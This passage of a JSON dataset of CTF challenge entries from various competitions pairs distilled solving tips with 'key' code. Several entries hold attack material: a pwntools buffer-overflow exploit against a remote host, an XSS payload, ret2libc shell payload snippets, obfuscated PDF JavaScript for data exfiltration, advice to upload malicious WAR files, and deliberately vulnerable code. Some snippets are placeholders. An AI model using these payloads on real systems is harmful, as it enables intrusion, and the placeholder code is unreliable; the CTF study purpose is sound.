app.run(port=3000)\n```"
    },
    {
        "name": "Over the Wire (part 1)",
        "write_up": "dataset/raw/Over the Wire (part 1).md",
        "type": "crypto",
        "competition": [
            "1337UP/2023",
            "https://ctftime.org/event/2134/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When dealing with encrypted files in cybersecurity challenges, especially when the file is a zip format requiring a password, conducting a thorough inspection of communications captured in network traffic (i.e., PCAP files) can reveal hints or explicit mentions of passwords. This involves searching for keywords like \"password\" within the packets using tools like Wireshark. If direct searches do not yield the password, additional hints provided in the communications can guide the correct context or modifications needed for the password.",
            "If initial attempts to use a discovered password fail, consider contextual hints suggesting the need for updating or modifying the password before trying again. In scenarios where a password includes elements that could vary over time (such as a year), incrementing these elements to the current or next logical value can be a successful strategy. This approach is particularly useful in situations where the communication hints at such alterations, reflecting a common practice of users updating passwords based on temporal context but maintaining a base pattern for memorability.\n\nExample of updating a password for access: If the original password is \"password_2022\", and a hint suggests \"updating it accordingly\", an updated attempt might be \"password_2023\" to gain access to encrypted files."
        ],
        "key": "```python\nimport binascii\n\ns = '000c29f3d174000c29f50a4308004500012094fa400040060235c0a810d5c0a81083bf99cbb55bd08fedb9cf5a42801101f6bc1300000101080a9af023ebb080049e504b03040a000900000077655d57cfeb7236360000002a00000008001c00666c61672e747874555409000382533e6582533e6575780b000104e803000004e80300008c44053b76ba819501568618a7d2dc4f76814251929b37ab7f0adc217f4efc3ac12c6a0dfd462346a1d173ab4732b7aac2b05b362adc504b0708cfeb7236360000002a000000504b01021e030a000900000077655d57cfeb7236360000002a000000080018000000000001000000a48100000000666c61672e747874555405000382533e6575780b000104e803000004e8030000504b050600000000010001004e000000880000000000'\nf = open('warmup/overthewire1/flagzip', 'wb')\nfor i in range(0, len(s), 2):\n   f.write(binascii.unhexlify(s[i:i+2]))\nf.close()\n```"
    },
    {
        "name": "Over the Wire (part 2)",
        "write_up": "dataset/raw/Over the Wire (part 2).md",
        "type": "crypto",
        "competition": [
            "1337UP/2023",
            "https://ctftime.org/event/2134/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving network packet analysis, specifically when a PCAP file is given, searching for strings related to the storyline or challenge description can lead to important discoveries. Use filters for specific protocols or formats like 'imf' to narrow down packets related to the clue or communication format mentioned in the challenge. This can reveal hidden or obfuscated communications, leading to the next steps or the required information to solve the challenge.",
            "When working with challenges related to data hidden within files, particularly images, considering steganography techniques like the Least Significant Bit (LSB) method can be crucial. Tools such as Stegsolve can be used to analyze and extract data hidden via steganography in images. This method relies on altering the least significant bits of the pixel values in an image to encode data. The visual change is minimal and often imperceptible to the naked eye, making it a popular method for hiding data within files. \n\n   Example technique for data extraction using LSB:\n   - Use a tool like Stegsolve.\n   - Navigate to 'Data Extract' and select all 0 bits for each of the color channels (Red, Green, Blue).\n   - Analyze the hex dump or output data for potential hidden information or flags."
        ],
        "key": "```python\nimport base64\n\njpgstr = ''  \npngstr = ''  \nfor i in range(0, len(jpg), 2):  \n   jpgstr += chr(int(jpg[i:i+2], 16))\n\nf = open('warmup/overthewire2/cat.jpg', 'wb')  \nf.write(base64.b64decode(jpgstr))  \nf.close()\n\nfor i in range(0, len(png), 2):  \n   pngstr += chr(int(png[i:i+2], 16))  \nf = open('warmup/overthewire2/cat.png', 'wb')  \nf.write(base64.b64decode(pngstr))  \nf.close()  \n```"
    },
    {
        "name": "Overflow 3",
        "write_up": "dataset/raw/Overflow 3.md",
        "type": "pwn",
        "competition": [
            "CyberYoddha/2020",
            "https://ctftime.org/event/1169/tasks/"
        ],
        "score": 250,
        "max_score": 900,
        "difficulty": 0.2777777777777778,
        "knowledge": [
            "In buffer overflow challenges where the goal is to overwrite a specific variable to achieve a condition, determine the buffer size and the distance to the target variable to construct the payload accurately. In this scenario, the buffer is of size 16 bytes, and the target variable `vuln` is positioned after the buffer. It requires padding the payload with enough bytes (in this case \"A\"*28) to reach the target variable's memory location and then appending the target value.\n   Example payload: `\"A\"*28 + p32(0xd3adb33f)`",
            "To interact with a remote service and exploit buffer overflow vulnerabilities, use scripting with libraries like pwntools. This simplifies the process of sending payloads and interacting with the service. The example script uses `remote` to connect to the service, `sendline` to send the exploit payload, and `interactive` to engage with the service after exploitation.\n   Example usage: \n   ```python\n   from pwn import *\n   s = remote(\"cyberyoddha.baycyber.net\", 10003)\n   payload = \"A\"*28 + p32(0xd3adb33f)\n   s.sendline(payload)\n   s.interactive()\n   ```"
        ],
        "key": "```c\nint main(void) {  \n\tlong vuln = 0;  \n    char buf[16];\n\n\tgets(buf);\n\n\tif (vuln == 0xd3adb33f){  \n\t\tsystem(\"/bin/sh\");  \n\t}  \n}  \n```"
    },
    {
        "name": "papa bear",
        "write_up": "dataset/raw/papa bear.md",
        "type": "crypto",
        "competition": [
            "HackTM/2020/Quals",
            "https://ctftime.org/event/956/tasks/"
        ],
        "score": 482,
        "max_score": 500,
        "difficulty": 0.964,
        "knowledge": [
            "In challenges focusing on reverse engineering where the algorithm modifies output based on input in a predictable manner, an effective approach can be to implement an iterative brute-force attack. This attack method involves trying every possible character in the input one by one and analyzing the changes in the output to determine which characters produce a desired change, like flipping \"M\" into \"W\". The key knowledge here is to use a scoring function that counts the number of correct characters in the output compared to a target or reference output. This approach allows for incrementally building up a correct input (the flag) without fully understanding the underlying algorithm. Example approach: For each character in the input, run the binary with the current guess of the flag, compare the output to the expected output, and measure how closely they match using a scoring function.",
            "When a binary or application writes output to an unusual file descriptor such as fd 0 (standard input) instead of the expected fd 1 (standard output) or fd 2 (standard error), a workaround is to redirect the output from the unexpected file descriptor to a standard one. This can be critical for capturing and processing the output in automated scripts or during reverse engineering efforts. Example correction in script: using `0>&1` in the command line (e.g., `./binary 0>&1`) to redirect fd 0 to fd 1, allowing the capturing of the binary's output for further processing or analysis."
        ],
        "key": "```php\nfunction check($password)\n{\n\t$cmd = sprintf(\"./papa_bear %s 0>&1\", escapeshellarg($password));\n\t$p   = popen($cmd, \"r\");\n\n\t/* Discard papa bear */\n\tfor($i = 0; $i < 7; $i++)\n\t\tfgets($p);\n\n\t/* Read MW */\n\t$buffer = \"\";\n\tfor($i = 0; $i < 7; $i++)\n\t\t$buffer .= fgets($p);\n\n\tfclose($p);\n\n\t/* Remove unwanted characters */\n\t$clear  = \"pbdqPQ-= \\n\";\n\t$buffer =  str_replace(str_split($clear), \"\", $buffer);\n\n\tassert(275 === strlen($buffer));\n\treturn $buffer;\n}\n```"
    },
    {
        "name": "Parsey Mcparser",
        "write_up": "dataset/raw/Parsey Mcparser.md",
        "type": "This challenge falls under the category of \"forensics\" as it involves analyzing a blob of data with an unknown format to extract specific information (user_names) based on the group they belong to.",
        "competition": [
            "Tenable/2021",
            "https://ctftime.org/event/1266/tasks/"
        ],
        "score": 50,
        "max_score": 250,
        "difficulty": 0.2,
        "knowledge": [
            "When faced with data in a non-standard format that includes identifiable key-value pairs, such conversion into a structured format like JSON objects facilitates easier manipulation and data extraction. This approach is particularly useful for parsing and analyzing semi-structured data where regular expressions might be too complex or inefficient. Example transformation snippet: \n```python\nimport json\n\nentry = '''[\"age\":39, \"user_name\":\"Reid Jolley\", \"Group\":\"Black\"]'''\nentry_fixed = entry.replace('\":', '\": \"').replace(', \"', '\", \"')\njson_object = json.loads(entry_fixed)\n```",
            "Once the data is structured (e.g., JSON objects), it's straightforward to implement filtering based on specific criteria, such as grouping or category. This is applicable in scenarios where data needs to be segmented or categorized for further analysis or processing. Example filtering code:\n```python\ndef filter_users_by_group(users_json, group_name):\n    return [user['user_name'] for user in users_json if user['Group'] == group_name]\n```"
        ],
        "key": "```python\ndef ParseNamesByGroup(blob, group_name):\n    import re\n    import json\n\n    # Extract all fields lists using regex\n    pattern = r'\\[.*?\\]'\n    matches = re.findall(pattern, blob)\n\n    users = []\n    for match in matches:\n        try:\n            # Transform each fields list into a JSON object\n            json_object = match.replace('age', '\"age\"').replace('user_name', '\"user_name\"').replace('Group', '\"Group\"')\n            data = json.loads(json_object)\n\n            # Check if user belongs to the specified group\n            if data['Group'] == group_name:\n                users.append(data['user_name'])\n        except json.JSONDecodeError:\n            continue\n\n    return users\n```"
    },
    {
        "name": "party",
        "write_up": "dataset/raw/party.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When analyzing reverse engineering challenges, especially those involving data structures, it's crucial to closely examine the operations performed on these structures. In the context of a challenge that utilizes operations similar to doubly linked lists or dancing links (DLX) to implement Algorithm X for solving exact cover problems, reverse engineers should:\n   - Identify the data structure based on the memory operations and their sequence. In instances resembling doubly linked list manipulations or DLX algorithm applications, expect the challenge to relate to Algorithm X or exact cover problem-solving strategies.\n   - Utilize IDA or similar tools to define structures and rename variables for clearer understanding. This approach aids in recognizing algorithm implementations and their purpose within the challenge.\n   - Example Approach: Define a `Person` structure in IDA when you detect sequential pointer modifications that hint at linked list operations.",
            "For reverse engineering challenges that employ hash functions to validate input or process data within constraints, reverse engineers can deconstruct the hash function's logic to reverse the hashing process or determine the input characteristics. Given a scenario where the hash function outputs a specific value based on the input set's order and size, the technique involves:\n   - Analyzing the hash function to understand how it iterates over the input and calculates the result. This includes breaking down the loop logic and arithmetic operations applied to each element or subset of the input.\n   - Employing mathematical or logical deductions to reverse engineer the expected input format from the desired hash output. This may involve operations such as division sequences that suggest an array's construction method or order.\n   - Example Technique: To reverse a complex hash function, iterate over potential input lengths and apply derived operations (like those matching the hash algorithm's structure) to backtrack to a possible input order or composition."
        ],
        "key": "```c  \nv4 = v2->d;  \ndo  \n{  \n   if ( v3->ptr < v4->ptr )  \n       v4 = v3;  \n   v3 = v3->d;  \n}  \nwhile ( v3 != v2 );  \nv4->u->d = v4->d;  \nv4->d->u = v4->u;  \nfor ( i = v4->r; i != v4; i = i->r )  \n{  \n   for ( j = i->d; j != i; j = j->d )  \n   {  \n       j->l->r = j->r;  \n       j->r->l = j->l;  \n       --j->ptr->ptr;  \n   }  \n}  \nv7 = v4->r;  \n```"
    },
    {
        "name": "Password 3",
        "write_up": "dataset/raw/Password 3.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "CyberYoddha/2020",
            "https://ctftime.org/event/1169/tasks/"
        ],
        "score": 225,
        "max_score": 900,
        "difficulty": 0.25,
        "knowledge": [
            "When facing a challenge involving encryption or encoding techniques, if the algorithm appears to be reversible (like XOR operations), reverse-engineering the process can effectively reveal the plaintext. This approach involves analyzing the code to understand the operations applied to the input and applying the inverse operations to the encoded or encrypted output. This method is particularly useful in CTF challenges where custom encryption algorithms are used, and the key or method of encryption is provided within the challenge itself.",
            "When the challenge involves base64 encoding following an XOR operation, first decode the base64 encoded string to get the XORed bytes. Then, apply the XOR operation with the same key used in the encryption process to get the original text. This approach is applicable to scenarios where the encryption process involves an XOR operation followed by base64 encoding. The steps include base64 decoding followed by XOR decryption with the specified key. \n    - Example payload to reverse the process:\n        ```python\n        base64_string = \"encoded_string_here\"\n        key = 0x55  # The XOR key used in the encryption process\n        base64_bytes = base64.b64decode(base64_string)\n        original_text = ''.join(chr(byte ^ key) for byte in base64_bytes)\n        print(original_text)\n        ```"
        ],
        "key": "```python  \ndef checkPassword(password):  \n if(len(password) != 40):  \n   return False  \n newPass = list(password)  \n for i in range(0,40):  \n   newPass[i] = chr(ord(newPass[i]) ^ 0x55)  \n finalPass = \"\".join(newPass)  \n passBytes = finalPass.encode(\"ascii\")  \n base64_bytes = base64.b64encode(passBytes)  \n base64_string = base64_bytes.decode(\"ascii\")  \n return base64_string ==\n\"FgwWARMuF2UhPQotZScKFTsxCjcVJmYKY2FqCiE9FSEmCjJlMTksKA==\"  \n```"
    },
    {
        "name": "Password",
        "write_up": "dataset/raw/Password.xls.md",
        "type": "crypto",
        "competition": [
            "AUCTF/2020",
            "https://ctftime.org/event/1020/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When analyzing a binary for encryption-related functionality, identifying unique strings or \"magic strings\" within the binary can lead to discovering the handler function and understanding the encryption method used. In scenarios where the binary is suspected to employ encryption or obfuscation, searching for strings related to known encryption tools or custom identifiers within the file can guide analysts directly to relevant code sections handling encryption or decryption processes.",
            "In scenarios involving encrypted data with known or predictable plaintext patterns (such as file headers or repetitive data blocks in the case of certain file formats), the CFB (Cipher Feedback) mode of operation can allow for piecing together parts of the plaintext without having the encryption key. This is possible because CFB uses the previous ciphertext block to encrypt the next block, meaning if an attacker knows or can guess the plaintext of one block, they can decipher subsequent blocks. This method is particularly useful when dealing with encrypted file formats that have predictable content, such as headers or templates that follow a specific structure.\n   \n   Example calculation revealing part of the plaintext without the key:  \n   ```python\n   enciv = bytearray(16)  \n   for i in range(16):  \n       enciv[i] = data[100+i] ^ 0xFF  \n   for i in range(len(data) // 100):  \n       dec = bytes(data[i*100 + j] ^ enciv[j] for j in range(16))  \n       dec_printable = ''.join(chr(x) if 0x20 <= x <= 0x7E else '.' for x in dec)  \n       print(dec.hex(), dec_printable)\n   ```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid decrypt_cfb(unsigned char *data, unsigned char *key, unsigned char *iv, int data_len) {\n    unsigned char enciv[16];\n    for (int i = 0; i < 16; i++) {\n        enciv[i] = data[100 + i] ^ 0xFF;\n    }\n    for (int i = 0; i < data_len / 100; i++) {\n        unsigned char dec[16];\n        for (int j = 0; j < 16; j++) {\n            dec[j] = data[i * 100 + j] ^ enciv[j];\n        }\n        // Process decrypted block (dec)\n    }\n}\n\nint main() {\n    FILE *f = fopen(\"password.xls.exe\", \"rb\");\n    fseek(f, 0x6801E, SEEK_SET);\n    unsigned char data[1600]; // Assuming enough space for data\n    fread(data, 1, sizeof(data), f);\n    fclose(f);\n\n    unsigned char key[32]; // Expanded password\n    unsigned char iv[16];  // Initialization vector\n\n    // Assume key and iv are set up correctly\n    decrypt_cfb(data, key, iv, sizeof(data));\n\n    return 0;\n}\n```"
    },
    {
        "name": "Paster",
        "write_up": "dataset/raw/Paster.md",
        "type": "web",
        "competition": [
            "HackPack/2020",
            "https://ctftime.org/event/1036/tasks/"
        ],
        "score": 100,
        "max_score": 497,
        "difficulty": 0.2012072434607646,
        "knowledge": [
            "When facing a Cross-Site Scripting (XSS) challenge, specifically where the goal is to execute JavaScript on a webpage, use simple payloads that inject JavaScript code directly into the HTML. Events like `onload` for SVG tags can trigger JavaScript execution. Example payload: `<svg/onload=alert(1)>`",
            "In challenges involving PHP hash comparisons where the hash starts with \"0e\" and is followed by digits, leverage PHP's type juggling vulnerability. This occurs because PHP treats strings starting with \"0e\" followed by numbers as scientific notation, equating them to 0. Find a string whose MD5 hash also starts with \"0e\" and is followed by digits to bypass the weak comparison. Example combination: `240610708`, since `md5('240610708') == \"0e....\"` which PHP interprets as 0, passing the weak type comparison."
        ],
        "key": "```php\n$hash = \"0e770334890835629000008642775106\";  \nif(md5($_REQUEST[\"combination\"]) == $hash){  \n echo \"  \nThe Flag is flag{...}  \n\";  \n}\n```"
    },
    {
        "name": "Patches",
        "write_up": "dataset/raw/Patches.md",
        "type": "reverse",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In a binary exploitation challenge, if the binary has a 'gets' or similar function that allows for a buffer overflow, and the binary includes useful gadgets like 'pop rdi; ret', these can be leveraged in a Ret2Libc attack to first leak a libc address (such as 'puts') to calculate the libc base address, then execute a system call (like 'execve') to spawn a shell. When constructing the payload for such attacks, gadgets can be used to manipulate the stack to control function arguments in a way that bypasses protections like ASLR.\n   - Example of a payload snippet for leaking an address: `payload = JUNK + p64(pop_rdi) + p64(got_puts) + p64(plt_puts) + p64(main)`\n   - Example of a payload snippet for spawning a shell: `payload = JUNK + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0) * 2 + p64(execve)`",
            "During binary analysis and reverse-engineering tasks, when encountering a binary that doesn't provide an obvious way to reach a desirable function (such as a function that would print out a flag), setting a breakpoint on the return (ret) instruction of a function and modifying the instruction pointer (RIP) value to point to the desirable function\u2019s address can force the program flow to jump to that function, thus executing it. This method can unlock or reveal hidden functionality within a binary without needing to understand or navigate through the entire program logic.\n   - Example of modifying `rip` in gdb: `set $rip = 0x0000555555555261`"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid print_flag() {\n    char flag[64];\n    FILE *f = fopen(\"flag.txt\", \"r\");\n    if (f == NULL) {\n        printf(\"Error opening flag file\\n\");\n        return;\n    }\n    fgets(flag, sizeof(flag), f);\n    printf(\"%s\\n\", flag);\n    fclose(f);\n}\n\nvoid main() {\n    char buffer[128];\n    printf(\"Goodbye.\\n\");\n    gets(buffer); // Vulnerable function\n}\n```"
    },
    {
        "name": "Patience",
        "write_up": "dataset/raw/Patience.md",
        "type": "forensics",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 474,
        "max_score": 497,
        "difficulty": 0.9537223340040242,
        "knowledge": [
            "When encountering a challenge that indicates a timing channel vulnerability, consider the possibility of information being transmitted through variances in response times. This approach is especially relevant in scenarios where seemingly indistinguishable behaviour hides subtle differences. These differences in timings can be decoded using a scheme, such as interpreting the delays as Morse code, where long delays represent dashes, medium delays dots, and short delays spaces.",
            "For challenges involving lazy evaluation languages like Haskell, where the evaluation is deferred until the result is absolutely needed, it's crucial to understand that the apparent complexity of language constructs can often be bypassed or significantly reduced by identifying and focusing on the evaluation strategy or the lack thereof. Memorization or memoization techniques can be particularly effective in optimizing performance by caching the results of expensive function calls. Sample in Haskell, demonstrating the use of memoization:\n\n```haskell\nimport Data.Function.Memoize\n\nfsize :: Int -> Integer  \nfsize = memoize fsize'\n\nfsize' :: Int -> Integer  \nfsize' 0 = fromIntegral $ length s0  \nfsize' i = 2 * fsize (i - 1) + 3 * fsize 0\n```\n\nThis technique can be applied universally to optimize recursive calls that re-compute the same results in lazy evaluated languages, reducing the computational complexity from exponential to linear or near-linear in many cases."
        ],
        "key": "```haskell\nmodule Main where\n\nimport Data.Bits  \nimport Data.Char  \nimport Control.Monad  \nimport System.IO  \nimport Data.Function.Memoize\n\ns0 =\n\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&'\\\"()*+,-./:;<=>?@[\\\\]^_`{|}~\"  \ns1 =\n\"1vI{e[8Td]-nQ.7O\\\"bl(jq@<0Vy&Z3~\\\\ps,aD^;BN9JUoh|CE2_6!G'rHuf>$S%MxgzKY4`c+WXA5F)mR}#PtL?*=i/:wk\"  \ns2 =\n\"Bp}i{XU%f$DR\\\\0<Lx=o\\\"Sl`bz)-e62|&JqFT!(C5yh;@u*.WaZ#Qv,?cr8wEm4_t19PH:j]>[NVMn7YGkK'^/~OIdsA+3g\"  \ns3 =\n\"_r+#yh[Y)S8aXJwV&jv\\\"o=I(6>pg,f-M]qbN4'EDKF\\\\t<3G%|$csPQm}~0@R;uU2z9iWB./HCk!{:Od^ZT7`Anl1e5L*x?\"\n\ndata Index = Index Int Int\n\nf :: Int -> [Char]  \nf 0 = s0  \nf arg = s1 ++ f (subtract 1 arg) ++ s2 ++ f (subtract 1 arg) ++ s3\n\nidx :: Index -> Char  \nidx (Index i j) = (f i !! j)\n\nflags = [Index 0 39,  \n    Index 5 282,  \n    Index 6 16240,  \n    Index 9 162889,  \n    Index 14 523151,  \n    Index 17 5536393,  \n    Index 7616 133142712,  \n    Index 8799 122076774,  \n    Index 8656 370998818,  \n    Index 9835 12169334,  \n    Index 9023 316222630,  \n    Index 9402 20517998,  \n    Index 9509 206287754,  \n    Index 5656 439741488,  \n    Index 9020 254692819,  \n    Index 5337 505473338,  \n    Index 7860 66985734,  \n    Index 5342 343561367,  \n    Index 7797 237439774,  \n    Index 6145 303374550,  \n    Index 5842 469397741,  \n    Index 6262 125811292,  \n    Index 8861 285489743,  \n    Index 9917 203482576,  \n    Index 6210 65894981,  \n    Index 5807 160395306,  \n    Index 6950 411117612,  \n    Index 9261 130413308,  \n    Index 6224 532384558,  \n    Index 5304 107223978,  \n    Index 6533 292707045,  \n    Index 8303 284494291,  \n    Index 9948 119890013,  \n    Index 8254 430252526,  \n    Index 8249 142828351,  \n    Index 8799 452127715,  \n    Index 6071 491307991,  \n    Index 8803 154654024,  \n    Index 9328 181393976,  \n    Index 6253 103923077,  \n    Index 7886 450071326,  \n    Index 7721 342235485,  \n    Index 6802 429438438,  \n    Index 6391 504612462,  \n    Index 5300 23633538,  \n    Index 9418 315942207,  \n    Index 9873 228342978,  \n    Index 6361 510000394,  \n    Index 5816 485654100,  \n    Index 8533 347840847,  \n    Index 9931 517634651,  \n    Index 8209 122749414,  \n    Index 9873 484029647,  \n    Index 9346 273221045]\n\nmain = do  \n forM_ (map idx flags) $ \\i -> do  \n   putChar i  \n   hFlush stdout  \n```"
    },
    {
        "name": "PCaS",
        "write_up": "dataset/raw/PCaS.md",
        "type": "This challenge is of the reverse type.",
        "competition": [
            "CyberSecurityRumble/2023/Quals",
            "https://ctftime.org/event/1942/tasks/"
        ],
        "score": 600,
        "max_score": 1000,
        "difficulty": 0.6,
        "knowledge": [
            "In challenges involving concurrent programming or multi-threading vulnerabilities, identifying race conditions can be crucial for exploitation. If the application logic does not properly handle concurrent requests, especially in systems designed to process tasks sequentially, it may lead to overlapping or incorrect data processing. This can be exploited by simultaneously initiating multiple instances or requests to interfere with the application's intended flow. The race condition in the described challenge was leveraged by starting the loading of multiple planes nearly at the same time, leading to an incorrect loading configuration being applied across different sessions.",
            "When dealing with challenges that involve time-based or computationally intensive tasks, such as solving a knapsack problem within a certain time frame, one can strategize by manipulating the input to control the difficulty of the task for the application. In the challenge, the exploit involves sending specifically crafted payloads that adjust the max weight and number of containers per plane to manipulate the difficulty of the underlying knapsack problem. Setting up the conditions so that one request forces the application into a longer, more intensive computation, while others are designed for quick resolution, can exploit time-based logic or processing flaws to achieve an undesired state in the application (e.g., overloading a plane).\n\nExample payload strategy for manipulating task difficulty:\n- For connections meant to consume more time: Send plane data with a small max weight and a full number of containers, crafting a problem that is near the limit of the computational timeout.\n- For connections designed for quick resolution: Send plane data with the minimum possible number of containers and set all to max weight, ensuring the problem is solved quickly and sets the result prematurely for all planes due to the race condition."
        ],
        "key": "```csharp\npublic class Airport\n{\n    private static object _resultLock = new object();\n    private static object _runwayLock = new object();\n    private static Result _result;\n\n    public void LoadPlane(Plane plane)\n    {\n        Thread worker = new Thread(() => DoWork(plane));\n        worker.Start();\n        worker.Join();\n    }\n\n    private void DoWork(Plane plane)\n    {\n        // Simulate knapsack solver with a timeout\n        if (TrySolveKnapsack(plane, out Result result))\n        {\n            lock (_resultLock)\n            {\n                _result = result;\n            }\n        }\n    }\n\n    private bool TrySolveKnapsack(Plane plane, out Result result)\n    {\n        // Simulate solving process\n        Thread.Sleep(15000); // Simulate timeout\n        result = new Result();\n        return true;\n    }\n\n    public void GetPlane(string callsign)\n    {\n        lock (_runwayLock)\n        {\n            // Reserve runway logic\n        }\n    }\n}\n```"
    },
    {
        "name": "PDF-Xfiltration",
        "write_up": "dataset/raw/PDF-Xfiltration.md",
        "type": "web",
        "competition": [
            "insomnihack/2022/Quals",
            "https://ctftime.org/event/1505/tasks/"
        ],
        "score": 451,
        "max_score": 451,
        "difficulty": 1.0,
        "knowledge": [
            "If a Capture The Flag (CTF) challenge involves analyzing or manipulating PDF files, understand that PDFs have both encrypted and unencrypted parts; only parts of the PDF are encrypted whereas the unencrypted parts can be freely modified without affecting the encrypted content. This property can be exploited by adding custom JavaScript code to the unencrypted parts to exfiltrate data. This approach utilizes the fact that certain PDF reader applications, including older versions, execute JavaScript code embedded within PDFs, potentially leaking sensitive information when the document is opened.",
            "When direct execution methods or straightforward payloads are blocked or ineffective due to security measures in a CTF challenge involving PDF files (such as blacklists or filters preventing XXE attacks or JavaScript execution), leverage more indirect or obfuscated techniques for code execution and data exfiltration. This can involve using alternative features of the PDF, such as embedded files or annotations, that can still be manipulated to execute JavaScript. Obfuscating JavaScript function calls (e.g., breaking up strings to bypass simple text matching in filters) can evade simple security measures, allowing the execution of custom scripts to exfiltrate data securely.\n\nExample payload for obfuscating JavaScript calls to bypass filters: `util.stringFromStream(this[\"getDat\" + \"aObje\" + \"ctContents\"](\"x\",true))`."
        ],
        "key": "```  \n10 0 obj  \n   << /Filter [/Crypt] /DecodeParms [<< /Name /Identity >>]  \n      /Length 25  \n   >>  \nstream  \nconsole.println(\"hello\");  \nendstream  \nendobj  \n```\n\n```  \n<< /PageLayout /OneColumn /Pages 4 0 R /Type /Catalog /OpenAction << /JS 10 0\nR /S /JavaScript >> >>  \n```\n\n```  \n<< /PageLayout /OneColumn /Pages 4 0 R /Type /Catalog /OpenAction << /JS 10 0\nR /S /JavaScript >> /Names << /EmbeddedFiles << /Names [(x) << /EF << /F 5 0 R\n>> >> ] >> >> >>  \n```"
    },
    {
        "name": "Peculiar gifts",
        "write_up": "dataset/raw/Peculiar gifts.md",
        "type": "misc",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 462,
        "max_score": 500,
        "difficulty": 0.924,
        "knowledge": [
            "In challenges categorized under \"Misc\" with attached image files, initially explore the possibility of steganography for hiding information. Tools such as Steghide can be employed for extracting hidden data from jpeg files. However, extraction using tools like Steghide usually requires a password. Creative guessing or context clues (e.g., using the file name or related text as the password) may reveal the password for decryption.\n\n   Example payload for extracting data with Steghide using a password: `steghide --extract -sf XMAS.jpeg -xf output.txt -p \"XMAS\"`",
            "If the correct password is unknown or unsuccessful guess attempts have been made, consider employing a brute force attack with steganography brute force tools like Stegseek, in conjunction with a comprehensive wordlist. This method systematically attempts numerous passwords until the correct one is found. For instances where the challenge author has disabled encryption within the steganography tool, it might be possible to retrieve the hidden message directly without needing the password.\n\n   Example payload for brute-forcing the password with Stegseek: `stegseek XMAS.jpeg crackstation-human-only.txt`"
        ],
        "key": "```python\ndef extract_message_from_image(image_path, password):\n    # Simulated function to extract hidden message from an image using steghide\n    # This is a placeholder for the actual steghide command\n    if password == \"XMAS\":\n        return \"--- Message from Santa Claus ---\\n\\nDid you know that base64 can be used for encoding scripts and websites?\\nMaybe we can use it for our gifts.\"\n    else:\n        raise ValueError(\"Incorrect password\")\n\ndef main():\n    image_path = \"XMAS.jpeg\"\n    password = \"XMAS\"\n    try:\n        message = extract_message_from_image(image_path, password)\n        print(message)\n    except ValueError as e:\n        print(e)\n\nif __name__ == \"__main__\":\n    main()\n```"
    },
    {
        "name": "Percival PCAP Pandemonium Part 1",
        "write_up": "dataset/raw/Percival PCAP Pandemonium Part 1.md",
        "type": "misc",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 25,
        "max_score": 500,
        "difficulty": 0.05,
        "knowledge": [
            "When dealing with a challenge that involves analyzing PCAP files to extract specific information, tools such as Wireshark can be extremely helpful. Filter and inspect the content of packets to identify unique attributes or data related to embedded devices within a network, their interactions, or specific actions like device restarts.",
            "In challenges involving Unrestricted File Upload vulnerabilities leading to Remote Code Execution (RCE), it's crucial to identify the system version and search for public exploits that could be used or modified to achieve code execution. If direct exploitation fails due to version mismatches or specific configurations, consider creating a malicious file, such as a WAR file in Java web applications, and deploying it through available upload functionalities while bypassing security restrictions."
        ],
        "key": "```java\n// Vulnerable code snippet for Unrestricted File Upload in WebCTRL system\nimport java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class UploadWarFileServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String contentType = request.getContentType();\n        if (contentType != null && contentType.startsWith(\"multipart/form-data\")) {\n            Part filePart = request.getPart(\"file\");\n            String fileName = getFileName(filePart);\n            InputStream fileContent = filePart.getInputStream();\n\n            // Save the uploaded file to the server's file system\n            File file = new File(\"/path/to/upload/directory/\" + fileName);\n            try (FileOutputStream fos = new FileOutputStream(file)) {\n                int read;\n                final byte[] bytes = new byte[1024];\n                while ((read = fileContent.read(bytes)) != -1) {\n                    fos.write(bytes, 0, read);\n                }\n            }\n\n            // Respond to the client\n            response.getWriter().println(\"File \" + fileName + \" uploaded successfully.\");\n        } else {\n            response.getWriter().println(\"Invalid request.\");\n        }\n    }\n\n    private String getFileName(Part part) {\n        String contentDisposition = part.getHeader(\"content-disposition\");\n        for (String cd : contentDisposition.split(\";\")) {\n            if (cd.trim().startsWith(\"filename\")) {\n                return cd.substring(cd.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n}\n```\n"
    },
    {
        "name": "Percival PCAP Pandemonium Part 2",
        "write_up": "dataset/raw/Percival PCAP Pandemonium Part 2.md",
        "type": "misc",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 75,
        "max_score": 500,
        "difficulty": 0.15,
        "knowledge": [
